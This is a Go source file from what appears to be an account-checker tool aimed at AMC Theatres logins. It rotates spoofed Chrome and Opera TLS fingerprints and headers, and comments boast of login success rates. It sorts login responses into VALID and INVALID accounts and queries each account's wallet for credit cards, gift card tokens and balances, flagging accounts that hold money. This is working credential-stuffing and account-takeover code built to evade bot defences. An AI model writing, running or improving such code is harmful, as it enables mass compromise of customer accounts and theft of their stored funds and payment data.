package header

import (
	"encoding/json"
	"math/rand"
	"strings"

	fhttp "github.com/bogdanfinn/fhttp"
	"github.com/bogdanfinn/tls-client/profiles"
)

type profileConfig struct {
	Profile   profiles.ClientProfile
	userAgent string
	secChUa   string
	Browser   string
}

var allProfileConfigs = []profileConfig{
	// Chrome 90%+ login success | full-flow benchmark 6/11/26
	{profiles.Chrome_103, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", `"Not;A=Brand";v="99", "Chromium";v="103", "Google Chrome";v="103"`, "chrome"},
	{profiles.Chrome_104, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", `"Chromium";v="104", "Not A;Brand";v="99", "Google Chrome";v="104"`, "chrome"},
	{profiles.Chrome_105, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", `"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"`, "chrome"},
	{profiles.Chrome_106, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", `"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"`, "chrome"},
	{profiles.Chrome_107, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", `"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"`, "chrome"},
	{profiles.Chrome_108, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", `"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"`, "chrome"},
	{profiles.Chrome_109, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", `"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"`, "chrome"},
	{profiles.Chrome_110, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", `"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"`, "chrome"},
	{profiles.Chrome_111, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", `"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"`, "chrome"},
	{profiles.Chrome_112, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", `"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"`, "chrome"},
	{profiles.Chrome_116_PSK, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", `"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"`, "chrome"},
	{profiles.Chrome_117, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", `"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"`, "chrome"},

	// Opera 90%+ login success | full-flow benchmark 6/11/26
	{profiles.Opera_89, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 OPR/89.0.4447.51", `"Opera";v="89", "Chromium";v="103", "Not=A?Brand";v="24"`, "opera"},
	{profiles.Opera_90, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 OPR/90.0.4480.54", `"Opera";v="90", "Chromium";v="104", "Not)A;Brand";v="8"`, "opera"},
	{profiles.Opera_91, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77", `"Opera";v="91", "Chromium";v="105", "Not)A;Brand";v="8"`, "opera"},
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.5",
	"en-GB,en;q=0.9",
	"en-GB,en-US;q=0.9,en;q=0.8",
	"en-US,en;q=0.9,es;q=0.8",
	"en-US,en;q=0.9,fr;q=0.8",
	"en-US,en;q=0.9,de;q=0.8",
	"en,en-US;q=0.9",
	"en-US",
	"en-US,en;q=0.8",
	"en-GB,en;q=0.7",
	"en-US,en;q=0.9,ja;q=0.8",
	"en-US,en;q=0.9,pt;q=0.8",
	"en-US,en;q=0.9,it;q=0.8",
	"en-US,en;q=0.9,ko;q=0.8",
	"en-US,en;q=0.9,zh-CN;q=0.8",
}

func RandomProfileConfig() profileConfig {
	return allProfileConfigs[rand.Intn(len(allProfileConfigs))]
}

func randomAcceptLanguage() string {
	return acceptLanguages[rand.Intn(len(acceptLanguages))]
}

func SetHeaders(req *fhttp.Request, cfg profileConfig) {
	req.Header.Set("user-agent", cfg.userAgent)

	switch cfg.Browser {
	case "chrome":
		req.Header.Set("accept", "*/*")
		req.Header.Set("accept-language", randomAcceptLanguage())
		req.Header.Set("content-type", "application/json")
		req.Header.Set("origin", "https://www.amctheatres.com")
		req.Header.Set("referer", "https://www.amctheatres.com/")
		req.Header.Set("sec-ch-ua", cfg.secChUa)
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-site")
		req.Header.Set("priority", "u=1, i")

	case "opera":
		req.Header.Set("accept", "*/*")
		req.Header.Set("accept-language", randomAcceptLanguage())
		req.Header.Set("content-type", "application/json")
		req.Header.Set("origin", "https://www.amctheatres.com")
		req.Header.Set("referer", "https://www.amctheatres.com/")
		req.Header.Set("sec-ch-ua", cfg.secChUa)
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-site")
		req.Header.Set("priority", "u=1, i")

	}
}

func CheckLoginStatus(body string) string {
	lower := strings.ToLower(body)

	failKeys := []string{
		"the information you entered doesn't match what we have on file",
		"password change required",
		"loyalty account is in an expired state",
		"login requires either an",
		"doesn't meet the formatting requirements.",
		"your authentication could not be validated",
	}
	for _, key := range failKeys {
		if strings.Contains(lower, key) {
			return "INVALID"
		}
	}

	if strings.Contains(lower, "accountid") {
		return "VALID"
	}

	return "UNKNOWN"
}

const LoginQuery = `
mutation Login($email: String!, $password: String!, $captcha: String!, $orderToken: String) {
  userLogin(input: {email: $email, password: $password, captcha: $captcha, captchaType: WEB, orderToken: $orderToken}) {
    user { ...GtmUser }
  }
}
fragment GtmUser on User {
  account {
    accountId emailAddress mobilePhoneNumber accountType
    isAlist: hasProductSubscription(subscriptionType: A_LIST)
    alist: productSubscription(subscriptionType: A_LIST) { typeCode }
    isShareholder onePassCount firstName lastName address1 address2 city state postalCode
  }
  sessionId
}`

const WalletQuery = `
query wallet {
  __typename
  viewer {
    __typename
    user {
      __typename
      id
      account {
        __typename
        id
        wallet {
          __typename
          ...wallet
        }
      }
    }
  }
}
fragment wallet on Wallet {
  __typename
  id
  creditCards {
    __typename
    ...creditCard
  }
  giftCards {
    __typename
    ...giftCard
  }
  giftCardSummary {
    __typename
    id
    balance
  }
  disneyRewardsCards {
    __typename
    ...disneyRewardsCard
  }
}
fragment creditCard on CreditCard {
  __typename
  id
  cardType
  lastFour
  expirationDate
  default
  merchantToken
  address1
  address2
  city
  state
  postalCode
  verified
}
fragment giftCard on GiftCard {
  __typename
  id
  lastFour
  token
}
fragment disneyRewardsCard on DisneyRewardsCard {
  __typename
  id
  lastFour
  merchantToken
}`

type WalletResponse struct {
	Data struct {
		Viewer struct {
			User struct {
				Account struct {
					Wallet struct {
						GiftCards []struct {
							LastFour string `json:"lastFour"`
							Token    string `json:"token"`
						} `json:"giftCards"`
						GiftCardSummary struct {
							Balance json.Number `json:"balance"`
						} `json:"giftCardSummary"`
						CreditCards []struct {
							CardType string `json:"cardType"`
							LastFour string `json:"lastFour"`
						} `json:"creditCards"`
					} `json:"wallet"`
				} `json:"account"`
			} `json:"user"`
		} `json:"viewer"`
	} `json:"data"`
}

func CheckGiftCards(resp WalletResponse) (float64, bool, string) {
	wallet := resp.Data.Viewer.User.Account.Wallet

	giftCardStatus := "NONE"
	if len(wallet.GiftCards) == 1 {
		giftCardStatus = "SINGLE"
	} else if len(wallet.GiftCards) > 1 {
		giftCardStatus = "MORE"
	}

	if len(wallet.GiftCards) == 0 {
		return 0, false, giftCardStatus
	}

	balance, err := wallet.GiftCardSummary.Balance.Float64()
	if err != nil || balance <= 0 {
		return 0, false, giftCardStatus
	}

	return balance, true, giftCardStatus
}